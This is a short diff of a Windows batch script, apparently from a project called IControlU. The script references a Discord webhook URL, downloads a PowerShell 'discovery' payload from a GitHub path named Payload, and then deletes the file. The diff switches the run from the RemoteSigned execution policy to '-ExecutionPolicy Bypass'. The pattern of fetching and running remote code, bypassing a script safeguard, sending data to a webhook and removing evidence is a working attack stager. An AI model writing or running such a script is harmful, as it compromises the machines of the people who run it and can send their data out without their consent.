@@ -15,7 +15,8 @@ echo "https://discord.com/api/webhooks/1167014901038993510/j2oWTYLE3mhwIjTAvOOCh
 powershell -command "Invoke-WebRequest -Uri 'https://github.com/ReylanTeo/IControlU/blob/d1e7e2f8d26435e8781df7863bb169733e491b8b/Payload/DiscordPowershellDiscovery.ps1?raw=true' -OutFile 'Discovery.ps1'"
 
 @REM Run the PowerShell discovery
-powershell -ExecutionPolicy RemoteSigned -File "Discovery.ps1"
+@REM powershell -ExecutionPolicy RemoteSigned -File "Discovery.ps1"
+powerShell -ExecutionPolicy Bypass -File "Discovery.ps1"
 
 @REM Delete the discovery file
 del "Discovery.ps1"
